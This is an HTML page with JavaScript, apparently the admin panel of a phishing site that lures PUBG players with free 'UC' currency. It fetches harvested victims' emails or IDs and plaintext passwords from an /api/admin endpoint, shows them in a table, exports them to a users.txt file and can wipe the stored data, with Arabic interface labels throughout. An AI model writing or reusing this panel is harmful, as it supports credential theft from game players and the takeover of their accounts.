<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>لوحة تحكم PUBG UC</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
  body{background:#0a0a0a;color:#fff;font-family:'Cairo',sans-serif;padding:20px}
 .card{background:#111;border:1px solid #00e5ff;border-radius:15px;padding:20px;margin-top:20px}
  h1{text-align:center;color:#00e5ff}
  input,button{padding:12px;border-radius:10px;border:none;margin:5px;font-size:16px;font-family:'Cairo'}
  input{background:#222;color:#fff;width:250px}
  button{background:#00e5ff;color:#000;font-weight:bold;cursor:pointer;transition:0.3s}
  button:hover{background:#00bcd4}
  button.danger{background:#ff3d00;color:#fff}
  table{width:100%;border-collapse:collapse;margin-top:20px}
  th,td{border:1px solid #333;padding:12px;text-align:center}
  th{background:#00e5ff;color:#000}
  #msg{color:#ffeb3b;margin-top:10px;text-align:center}
 .btns{display:flex;gap:10px;justify-content:center;margin-top:15px}
</style>
</head>
<body>
  <h1>لوحة تحكم PUBG UC</h1>

  <div class="card">
    <input type="password" id="pass" placeholder="دخل باسورد الادمن">
    <button onclick="loadUsers()">عرض اليوزرز</button>

    <div class="btns">
      <button class="danger" onclick="deleteAll()">🗑️ مسح كل البيانات</button>
      <button onclick="downloadTXT()">💾 حفظ TXT</button>
    </div>
    <div id="msg"></div>
  </div>

  <div class="card">
    <table id="tbl" style="display:none">
      <thead><tr><th>#</th><th>الايميل / ID</th><th>الباسورد</th><th>تاريخ التسجيل</th></tr></thead>
      <tbody id="tbody"></tbody>
    </table>
  </div>

<script>
let usersData = [];

async function loadUsers(){
  const pass = document.getElementById('pass').value;
  const msg = document.getElementById('msg');
  msg.innerText = "جاري التحميل...";

  const res = await fetch(`/api/admin?pass=${pass}`);
  const data = await res.json();

  if(!res.ok){ msg.innerText = "❌ الباسورد غلط"; return; }

  usersData = data;
  if(data.length === 0){ msg.innerText = "مفيش يوزرز مسجلين"; document.getElementById('tbl').style.display = "none"; return; }

  msg.innerText = `✅ تم العثور على ${data.length} يوزر`;
  document.getElementById('tbl').style.display = "table";
  document.getElementById('tbody').innerHTML = data.map((u,i) =>
    `<tr><td>${i+1}</td><td>${u.id}</td><td>${u.password}</td><td>${u.date}</td></tr>`
  ).join('');
}

async function deleteAll(){
  if(!confirm("متأكد عايز تمسح كل البيانات؟")) return;
  const pass = document.getElementById('pass').value;
  const res = await fetch(`/api/admin?pass=${pass}`, {method: 'DELETE'});
  if(res.ok){ alert("تم المسح"); loadUsers(); }
}

function downloadTXT(){
  if(usersData.length === 0){ alert("مفيش بيانات للحفظ"); return; }
  let txt = "PUBG UC - Users List\n";
  usersData.forEach((u,i) => {
    txt += `${i+1}. Email: ${u.id} | Password: ${u.password} | Date: ${u.date}\n`;
  });
  const blob = new Blob([txt], {type: 'text/plain'});
  const link = document.createElement('a');
  link.href = URL.createObjectURL(blob);
  link.download = "users.txt";
  link.click();
}
</script>
</body>
</html>
